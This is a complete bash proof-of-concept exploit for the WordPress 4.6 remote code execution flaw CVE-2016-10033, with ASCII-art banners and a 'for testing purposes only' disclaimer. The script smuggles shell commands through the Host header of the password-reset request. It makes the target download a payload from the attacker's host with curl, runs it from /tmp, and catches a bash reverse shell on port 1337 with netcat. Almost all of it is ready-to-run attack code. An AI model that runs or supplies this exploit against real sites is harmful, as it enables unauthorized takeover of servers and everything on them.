#!/bin/bash
#
#      __                     __   __  __           __
#     / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
#    / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
#   / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
#  /_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
#            /____/
#
#
# WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit
# CVE-2016-10033
#
# wordpress-rce-exploit.sh (ver. 1.0)
#
#
# Discovered and coded by
#
# Dawid Golunski (@dawid_golunski)
# https://legalhackers.com
#
# ExploitBox project:
# https://ExploitBox.io
#
#
# Full advisory URL: 
# https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html
#
# Exploit src URL:
# https://exploitbox.io/exploit/wordpress-rce-exploit.sh
#
#
# Tested on WordPress 4.6:
# https://github.com/WordPress/WordPress/archive/4.6.zip
#
# Usage:
# ./wordpress-rce-exploit.sh target-wordpress-url
#
#wp-json/wp/v2/users 可以查看wp用户
# Disclaimer:
# For testing purposes only
#
#
# -----------------------------------------------------------------
#
# Interested in vulns/exploitation?
#
#
#                        .;lc'
#                    .,cdkkOOOko;.
#                 .,lxxkkkkOOOO000Ol'
#             .':oxxxxxkkkkOOOO0000KK0x:'
#          .;ldxxxxxxxxkxl,.'lk0000KKKXXXKd;.
#       ':oxxxxxxxxxxo;.       .:oOKKKXXXNNNNOl.
#      '';ldxxxxxdc,.              ,oOXXXNNNXd;,.
#     .ddc;,,:c;.         ,c:         .cxxc:;:ox:
#     .dxxxxo,     .,   ,kMMM0:.  .,     .lxxxxx:
#     .dxxxxxc     lW. oMMMMMMMK  d0     .xxxxxx:
#     .dxxxxxc     .0k.,KWMMMWNo :X:     .xxxxxx:
#     .dxxxxxc      .xN0xxxxxxxkXK,      .xxxxxx:
#     .dxxxxxc    lddOMMMMWd0MMMMKddd.   .xxxxxx:
#     .dxxxxxc      .cNMMMN.oMMMMx'      .xxxxxx:
#     .dxxxxxc     lKo;dNMN.oMM0;:Ok.    'xxxxxx:
#     .dxxxxxc    ;Mc   .lx.:o,    Kl    'xxxxxx:
#     .dxxxxxdl;. .,               .. .;cdxxxxxx:
#     .dxxxxxxxxxdc,.              'cdkkxxxxxxxx:
#      .':oxxxxxxxxxdl;.       .;lxkkkkkxxxxdc,.
#          .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.
#             .':oxxxxxxxxx.ckkkkkkkkxl,.
#                 .,cdxxxxx.ckkkkkxc.
#                    .':odx.ckxl,.
#                        .,.'.
#
# https://ExploitBox.io
#
# https://twitter.com/Exploit_Box
#
# -----------------------------------------------------------------



rev_host="192.168.57.1"

function prep_host_header() {
      cmd="$1"
      rce_cmd="\${run{$cmd}}";

      # replace / with ${substr{0}{1}{$spool_directory}}
      #sed 's^/^${substr{0}{1}{$spool_directory}}^g'
      rce_cmd="`echo $rce_cmd | sed 's^/^\${substr{0}{1}{\$spool_directory}}^g'`"

      # replace ' ' (space) with
      #sed 's^ ^${substr{10}{1}{$tod_log}}$^g'
      rce_cmd="`echo $rce_cmd | sed 's^ ^\${substr{10}{1}{\$tod_log}}^g'`"
      #return "target(any -froot@localhost -be $rce_cmd null)"
      host_header="target(any -froot@localhost -be $rce_cmd null)"
      return 0
}


#cat exploitbox.ans
intro="
DQobWzBtIBtbMjFDG1sxOzM0bSAgICAuO2xjJw0KG1swbSAbWzIxQxtbMTszNG0uLGNka2tPT09r
bzsuDQobWzBtICAgX19fX19fXxtbOEMbWzE7MzRtLiwgG1swbV9fX19fX19fG1s1Q19fX19fX19f
G1s2Q19fX19fX18NCiAgIFwgIF9fXy9fIF9fX18gG1sxOzM0bScbWzBtX19fXBtbNkMvX19fX19c
G1s2Q19fX19fX19cXyAgIF8vXw0KICAgLyAgXy8gICBcXCAgIFwvICAgLyAgIF9fLxtbNUMvLyAg
IHwgIFxfX19fXy8vG1s3Q1wNCiAgL19fX19fX19fXz4+G1s2QzwgX18vICAvICAgIC8tXCBfX19f
IC8bWzVDXCBfX19fX19fLw0KIBtbMTFDPF9fXy9cX19fPiAgICAvX19fX19fX18vICAgIC9fX19f
X19fPg0KIBtbNkMbWzE7MzRtLmRkYzssLDpjOy4bWzlDG1swbSxjOhtbOUMbWzM0bS5jeHhjOjs6
b3g6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eG8sG1s1QxtbMG0uLCAgICxrTU1NMDouICAuLBtb
NUMbWzM0bS5seHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG1sVy4gb01N
TU1NTU1LICBkMBtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1
QxtbMG0uMGsuLEtXTU1NV05vIDpYOhtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDLhtbMTsz
NG1keHh4eHhjG1s2QxtbMG0ueE4weHh4eHh4eGtYSywbWzZDG1szNG0ueHh4eHh4Og0KG1szN20g
G1s2Qy4bWzE7MzRtZHh4eHh4YyAgICAbWzBtbGRkT01NTU1XZDBNTU1NS2RkZC4gICAbWzM0bS54
eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s2QxtbMG0uY05NTU1OLm9NTU1NeCcb
WzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4YxtbNUMbWzBtbEtvO2RO
TU4ub01NMDs6T2suICAgIBtbMzRtJ3h4eHh4eDoNChtbMzdtIBtbNkMbWzE7MzRtLmR4eHh4eGMg
ICAgG1swbTtNYyAgIC5seC46bywgICAgS2wgICAgG1szNG0neHh4eHh4Og0KG1szN20gG1s2Qxtb
MTszNG0uZHh4eHh4ZGw7LiAuLBtbMTVDG1swOzM0bS4uIC47Y2R4eHh4eHg6DQobWzM3bSAbWzZD
G1sxOzM0bS5keHh4eCAbWzBtX19fX19fX18bWzEwQ19fX18gIF9fX19fIBtbMzRteHh4eHg6DQob
WzM3bSAbWzdDG1sxOzM0bS4nOm94IBtbMG1cG1s2Qy9fIF9fX19fX19fXCAgIFwvICAgIC8gG1sz
NG14eGMsLg0KG1szN20gG1sxMUMbWzE7MzRtLiAbWzBtLxtbNUMvICBcXBtbOEM+G1s3QzwgIBtb
MzRteCwNChtbMzdtIBtbMTJDLxtbMTBDLyAgIHwgICAvICAgL1wgICAgXA0KIBtbMTJDXF9fX19f
X19fXzxfX19fX19fPF9fX18+IFxfX19fPg0KIBtbMjFDG1sxOzM0bS4nOm9keC4bWzA7MzRtY2t4
bCwuDQobWzM3bSAbWzI1QxtbMTszNG0uLC4bWzA7MzRtJy4NChtbMzdtIA0K"
intro2="
ICAgICAgICAgICAgICAgICAgIBtbNDRtfCBFeHBsb2l0Qm94LmlvIHwbWzBtCgobWzk0bSsgLS09
fBtbMG0gG1s5MW1Xb3JkcHJlc3MgQ29yZSAtIFVuYXV0aGVudGljYXRlZCBSQ0UgRXhwbG9pdBtb
MG0gIBtbOTRtfBtbMG0KG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAgICAgICAgICBE
aXNjb3ZlcmVkICYgQ29kZWQgQnkgICAgICAgICAgICAgICAgG1s5NG18G1swbQobWzk0bSsgLS09
fBtbMG0gICAgICAgICAgICAgICAbWzk0bURhd2lkIEdvbHVuc2tpG1swbSAgICAgICAgICAgICAg
ICAgIBtbOTRtfBtbMG0gChtbOTRtKyAtLT18G1swbSAgICAgICAgIBtbOTRtaHR0cHM6Ly9sZWdh
bGhhY2tlcnMuY29tG1swbSAgICAgICAgICAgICAgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBt
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBt
ChtbOTRtKyAtLT18G1swbSAiV2l0aCBHcmVhdCBQb3dlciBDb21lcyBHcmVhdCBSZXNwb25zaWJp
bGl0eSIgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAqIEZvciB0ZXN0aW5nIHB1
cnBvc2VzIG9ubHkgKiAgICAgICAgICAbWzk0bXwbWzBtIAoKCg=="
echo "$intro"  | base64 -d
echo "$intro2" | base64 -d

if [ "$#" -ne 1 ]; then
echo -e "Usage:\n$0 target-wordpress-url\n"
exit 1
fi
target="$1"
echo -ne "\e[91m[*]\033[0m"
read -p " Sure you want to get a shell on the target '$target' ? [y/N] " choice
echo


if [ "$choice" == "y" ]; then

echo -e "\e[92m[*]\033[0m Guess I can't argue with that... Let's get started...\n"
echo -e "\e[92m[+]\033[0m Connected to the target"

# Serve payload/bash script on :80
RCE_exec_cmd="(sleep 3s && nohup bash -i >/dev/tcp/$rev_host/1337 0<&1 2>&1) &"
echo "$RCE_exec_cmd" > rce.txt
python -m SimpleHTTPServer 80 2>/dev/null >&2 &
hpid=$!

# Save payload on the target in /tmp/rce
cmd="/usr/bin/curl -o/tmp/rce $rev_host/rce.txt"
prep_host_header "$cmd"
curl -H"Host: $host_header" -s -d 'user_login=admin&wp-submit=Get+New+Password' $target/wp-login.php?action=lostpassword
echo -e "\n\e[92m[+]\e[0m Payload sent successfully"

# Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce
cmd="/bin/bash /tmp/rce"
prep_host_header "$cmd"
curl -H"Host: $host_header" -d 'user_login=admin&wp-submit=Get+New+Password' $target/wp-login.php?action=lostpassword &
echo -e "\n\e[92m[+]\033[0m Payload executed!"

echo -e "\n\e[92m[*]\033[0m Waiting for the target to send us a \e[94mreverse shell\e[0m...\n"
nc -vv -l -p 1337
echo
else
echo -e "\e[92m[+]\033[0m Responsible choice ;) Exiting.\n"
exit 0
fi


echo "Exiting..."
exit 0